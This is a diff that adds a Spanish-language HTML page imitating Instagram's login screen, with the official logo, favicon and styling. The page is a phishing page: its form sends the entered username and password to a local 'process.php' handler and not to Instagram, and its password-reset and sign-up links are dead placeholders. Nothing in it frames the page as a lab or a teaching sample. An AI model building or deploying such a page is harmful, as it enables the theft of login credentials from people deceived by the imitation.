@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png">
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 350px;
+      background-color: #fff;
+      border-radius: 5px;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .login-box {
+      margin-bottom: 10px;
+    }
+
+    .login-box img {
+      width: 60%;
+      margin: 0 auto 30px;
+    }
+
+    .login-form input {
+      width: 100%;
+      height: 38px;
+      margin: 6px 0;
+      padding: 0 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+      background-color: #fafafa;
+      box-sizing: border-box;
+    }
+
+    .login-form button {
+      width: 100%;
+      height: 38px;
+      margin-top: 10px;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 3px;
+      color: white;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-form button:disabled {
+      background-color: #b2dffc;
+      cursor: not-allowed;
+    }
+
+    .forgot-password {
+      margin-top: 15px;
+      font-size: 12px;
+    }
+
+    .forgot-password a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .signup-box {
+      margin-top: 10px;
+      background-color: #fff;
+      text-align: center;
+      padding: 10px 0;
+    }
+
+    .signup-box a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .signup-box a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
+      <!-- Formulario de inicio de sesión -->
+      <form class="login-form" method="POST" action="process.php">
+        <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        <button type="submit">Iniciar sesión</button>
+      </form>
+      <div class="forgot-password">
+        <a href="#">¿Olvidaste tu contraseña?</a>
+      </div>
+    </div>
+    <div class="signup-box">
+      ¿No tienes una cuenta? <a href="#">Regístrate</a>
+    </div>
+  </div>
+</body>
+</html>
